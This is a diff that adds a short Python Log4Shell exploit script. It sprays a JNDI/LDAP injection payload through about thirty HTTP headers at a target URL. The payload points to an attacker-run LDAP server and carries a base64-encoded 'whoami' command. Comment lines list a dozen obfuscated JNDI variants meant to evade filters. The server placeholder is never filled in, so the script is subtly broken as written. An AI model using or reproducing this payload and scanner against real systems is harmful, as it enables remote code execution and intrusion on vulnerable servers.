@@ -1,0 +1,32 @@
+# jdksec 2022
+import requests
+import sys
+import urllib3
+import time
+
+# Other payloads
+# ?${jndi:ldap://qwerty
+# ${jndi:rmi://qwerty
+# $%7Bjndi:ldap:$%7B::-/%7D/qwerty
+# ${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//qwerty
+# ${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://qwerty
+# ${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://qwerty
+# ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://qwerty
+# ${jnd${upper:ı}:ldap://qwerty
+# ${jnd${sys:SYS_NAME:-i}:qwerty
+# ${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://qwerty
+# ${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://qwerty
+# ${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://qwerty
+# ${\u006a\u006e\u0064\u0069:ldap://qwerty
+
+urllib3.disable_warnings()
+url = sys.argv[1]
+hostname = url.replace('http://','').replace('https://','')
+ssrf_host = '?${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//{JNDISERVER}:1389/Basic/Command/Base64/d2hvYW1p}'
+domain_name = hostname.split('/')[0]
+
+headers = ['X-Forwarded-For','X-Host','True-Client-IP','Referer','X-WAP-Profile','Contact','From','User-Agent','Referer','X-Original-URL','X-Wap-Profile','Profile','X-Arbitrary','X-HTTP-DestinationURL','X-Forwarded-Proto','Origin','X-Forwarded-Host','X-Forwarded-Server','Proxy-Host','Destination','Proxy','Via','True-Client-IP','Client-IP','X-Client-IP','X-Real-IP','X-Originating-IP','CF-Connecting_IP','Forwarded']
+
+for header in headers:
+  request_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "*/*", "Accept-Language": "en-GB,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/xml", "Connection": "close", header: ssrf_host} 
+  response = requests.get(url, headers=request_headers,  verify=False)
